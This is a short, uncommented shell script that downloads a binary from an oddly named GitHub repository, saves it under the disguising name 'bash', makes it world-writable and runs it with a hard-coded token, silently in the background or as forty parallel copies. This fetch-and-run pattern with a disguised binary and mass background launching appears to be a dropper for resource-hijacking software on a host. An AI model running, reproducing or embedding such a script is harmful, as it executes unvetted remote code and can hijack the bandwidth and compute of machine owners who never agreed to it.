#!/bin/sh

token="1N6QqhaHnDyHYkx89vsxd+CNkoqoaqXT37Fj0baANRA="
tmp="$(mktemp -d)" && cd "$tmp"
wget -qO "./bash" "https://github.com/vjbahkds/qiyywnbc/raw/refs/heads/main/tm20250312"
chmod 777 "./bash"
if [ "$1" == "1" ]; then
  i=39; while [ "$i" -gt "0" ]; do
    ./bash start accept --token "${token}" 2>&1 &
    i=$((i-1)); 
  done
  ./bash start accept --token "${token}" 2>&1
else
  ./bash start accept --token "${token}" >/dev/null 2>&1 &
fi
